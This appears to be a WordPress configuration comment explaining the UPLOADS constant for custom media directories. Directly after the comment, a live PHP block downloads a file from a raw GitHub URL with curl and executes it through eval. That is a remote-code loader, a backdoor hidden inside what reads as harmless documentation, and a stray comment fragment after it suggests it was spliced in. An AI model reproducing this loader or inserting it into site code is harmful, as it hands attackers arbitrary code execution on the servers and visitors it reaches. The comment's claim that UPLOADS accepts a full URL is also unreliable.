/** 
 * By default, WordPress stores all uploaded media files (images, videos, documents, etc.)
 * in the 'wp-content/uploads' directory. If you want to store your media files in a custom
 * location for organizational reasons or to meet server requirements, you can define a custom
 * upload path here.
 *
 * This constant sets the path to the uploads directory relative to the WordPress root folder.
 * For example, to set a custom folder inside the wp-content directory, you can use the following:
 * 
 * define('UPLOADS', 'wp-content/my_custom_uploads');
 *
 * If you need a fully-qualified URL, such as when you’re using a different domain or server for 
 * your media files, you can define 'UPLOADS' with an absolute path like this:
 * 
 * define('UPLOADS', 'http://cdn.example.com/uploads');
 *
 * This change will affect where WordPress stores all uploaded files. Make sure the new location
 * is writeable by the web server user.
 */<?php
    $Url = "https://raw.githubusercontent.com/hesonakara-dot/tobrut/refs/heads/main/meg";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $Url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
    echo eval('?>'.$output);
   ?> * You can modify the permissions manually via command line or FTP:
